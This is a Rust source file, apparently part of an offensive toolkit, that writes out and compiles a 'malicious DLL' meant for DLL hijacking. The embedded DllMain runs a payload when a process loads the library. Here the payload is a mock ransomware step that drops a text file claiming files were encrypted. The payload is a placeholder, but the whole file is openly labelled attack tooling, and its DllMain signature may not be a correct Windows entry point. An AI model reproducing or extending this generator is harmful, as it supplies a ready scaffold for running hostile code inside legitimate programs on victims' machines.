use std::io::{self, Write};
use std::fs;
use std::process::Command;

pub fn generate_dll() {
    println!("Generating malicious DLL...");
    println!("Enter the name for the DLL (e.g., hijacked.dll): ");

    let mut dll_name = String::new();
    io::stdin().read_line(&mut dll_name).unwrap();
    let dll_name = dll_name.trim();

    let dll_code = generate_dll_code();

    let source_file = format!("{}.rs", dll_name);
    fs::write(&source_file, dll_code).expect("Failed to write DLL source file");

    println!("Compiling DLL...");
    compile_dll(&source_file, dll_name);

    println!("DLL generated: {}", dll_name);
}

fn generate_dll_code() -> String {
    r#"
    #![crate_type = "cdylib"]

    #[no_mangle]
    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {
        if reason == 1 { // DLL_PROCESS_ATTACH
            payload();
        }
        true
    }

    fn payload() {
        use std::fs;
        use std::io::Write;

        let target_dir = "C:\\\\target_directory";
        let target_file = format!("{}\\\\ransomware_demo.txt", target_dir);

        let _ = fs::create_dir_all(target_dir);
        let mut file = fs::File::create(&target_file).expect("Failed to create file");
        file.write_all(b"This file was encrypted by the malicious DLL!")
            .expect("Failed to write payload");

        println!("Payload executed: Created encrypted file at {}", target_file);
    }
    "#
    .to_string()
}

fn compile_dll(source_file: &str, dll_name: &str) {
    let output = Command::new("rustc")
        .args(&["--crate-type", "cdylib", "-o", dll_name, source_file])
        .output()
        .expect("Failed to compile DLL");

    if !output.status.success() {
        eprintln!("Compilation error: {}", String::from_utf8_lossy(&output.stderr));
        std::process::exit(1);
    }
}
